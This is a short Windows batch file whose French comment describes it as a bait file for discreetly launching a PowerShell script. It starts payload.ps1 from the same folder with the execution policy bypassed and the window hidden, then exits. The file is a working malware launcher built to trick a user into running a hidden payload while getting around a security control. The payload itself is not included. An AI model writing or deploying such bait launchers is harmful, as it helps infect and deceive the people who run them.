:: runme.bat
:: Fichier appât pour lancer discrètement le script PowerShell

@echo off
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0payload.ps1"
exit
